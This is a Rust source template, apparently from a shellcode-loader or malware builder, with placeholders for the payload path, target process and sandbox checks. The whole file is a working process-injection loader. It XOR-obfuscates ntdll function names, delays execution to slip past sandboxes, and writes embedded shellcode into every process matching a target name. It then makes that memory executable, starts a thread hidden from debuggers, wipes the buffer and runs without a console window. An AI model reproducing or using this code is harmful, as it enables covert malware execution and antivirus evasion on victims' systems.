#![windows_subsystem = "windows"]
#![allow(non_snake_case)]

use sysinfo::System;
use std::ffi::{CString, OsStr};
use std::include_bytes;
use std::ptr::null_mut;

use winapi::{
    um::{
        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE, PAGE_EXECUTE_READ, THREAD_ALL_ACCESS},
        lmaccess::ACCESS_ALL,
        libloaderapi::{GetModuleHandleA, GetProcAddress},
    },
    shared::{
        ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS},
    },
    ctypes::c_void,
};

use std::time::Instant;

{{IMPORTS}}

{{SANDBOX_IMPORTS}}

{{DECRYPTION_FUNCTION}}

const HIDE_FROM_DEBUGGER: u32 = 0x4;

#[repr(C)]
struct CID {
    proc_id: HANDLE,
    thread_id: HANDLE,
}

const K: u8 = {{API_KEY}};
const OBF_A: &[u8] = &{{OBF_NT_OPEN_PROCESS}};
const OBF_B: &[u8] = &{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}};
const OBF_C: &[u8] = &{{OBF_NT_WRITE_VIRTUAL_MEMORY}};
const OBF_D: &[u8] = &{{OBF_NT_PROTECT_VIRTUAL_MEMORY}};
const OBF_E: &[u8] = &{{OBF_NT_CREATE_THREAD_EX}};
const OBF_H: &[u8] = &{{OBF_NT_DELAY_EXECUTION}};

fn r(d: &[u8]) -> Vec<u8> {
    d.iter().map(|b| b ^ K).collect()
}

unsafe fn g(n: &[u8]) -> *const () {
    let h = GetModuleHandleA(b"ntdll\0".as_ptr() as *const i8);
    let s = r(n);
    let c = CString::new(s).unwrap();
    GetProcAddress(h, c.as_ptr()) as *const ()
}

type FA = unsafe extern "system" fn(*mut HANDLE, u32, *mut OBJECT_ATTRIBUTES, *mut CID) -> i32;
type FB = unsafe extern "system" fn(HANDLE, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
type FC = unsafe extern "system" fn(HANDLE, *mut c_void, *mut c_void, usize, *mut usize) -> i32;
type FD = unsafe extern "system" fn(HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
type FE = unsafe extern "system" fn(*mut HANDLE, u32, *mut c_void, HANDLE, *mut c_void, *mut c_void, u32, usize, usize, usize, *mut c_void) -> i32;
type FH = unsafe extern "system" fn(u32, *const i64) -> i32;

fn boxboxbox(tar: &str) -> Vec<usize> {
    let mut dom: Vec<usize> = Vec::new();
    let s = System::new_all();
    for pro in s.processes_by_exact_name(OsStr::new(tar)) {
        dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
    }
    dom
}

fn pause(ms: i64) {
    unsafe {
        let f: FH = std::mem::transmute(g(OBF_H));
        let interval: i64 = -(ms * 10_000);
        f(0, &interval);
    }
}

fn check_environment() -> bool {
    let start = Instant::now();
    pause(3000);
    start.elapsed().as_millis() >= 2500
}

fn wipe(buf: &mut Vec<u8>) {
    for b in buf.iter_mut() {
        unsafe { std::ptr::write_volatile(b as *mut u8, 0); }
    }
    buf.clear();
}

fn enhance(mut buf: Vec<u8>, tar: usize) {
    let mut process_handle = tar as HANDLE;
    let mut oa = OBJECT_ATTRIBUTES::default();
    let mut ci = CID {
        proc_id: process_handle,
        thread_id: null_mut(),
    };

    unsafe {
        let f_open: FA = std::mem::transmute(g(OBF_A));
        let f_alloc: FB = std::mem::transmute(g(OBF_B));
        let f_write: FC = std::mem::transmute(g(OBF_C));
        let f_protect: FD = std::mem::transmute(g(OBF_D));
        let f_thread: FE = std::mem::transmute(g(OBF_E));

        let s = f_open(&mut process_handle, ACCESS_ALL, &mut oa, &mut ci);
        if !NT_SUCCESS(s) { return; }

        pause(150);

        let mut base: *mut c_void = null_mut();
        let mut size: usize = buf.len();
        let s = f_alloc(process_handle, &mut base, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(s) { return; }

        pause(200);

        let buf_len = buf.len();
        let mut written: usize = 0;
        let s = f_write(process_handle, base, buf.as_mut_ptr() as *mut c_void, buf_len, &mut written);
        if !NT_SUCCESS(s) { return; }

        wipe(&mut buf);
        pause(150);

        let mut old_protect: u32 = 0;
        let mut region_size = buf_len;
        let s = f_protect(process_handle, &mut base, &mut region_size, PAGE_EXECUTE_READ, &mut old_protect);
        if !NT_SUCCESS(s) { return; }

        pause(100);

        let mut th: HANDLE = null_mut();
        f_thread(&mut th, THREAD_ALL_ACCESS, null_mut(), process_handle, base, null_mut(), HIDE_FROM_DEBUGGER, 0, 0, 0, null_mut());
    }
}

fn main() {
    {{SANDBOX}}

    if !check_environment() { return; }

    let tar: &str = "{{TARGET_PROCESS}}";

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = buf.to_vec();

    {{MAIN}}

    let list: Vec<usize> = boxboxbox(tar);
    if !list.is_empty() {
        for i in &list {
            enhance(vec.clone(), *i);
        }
    }
}

{{DLL_MAIN}}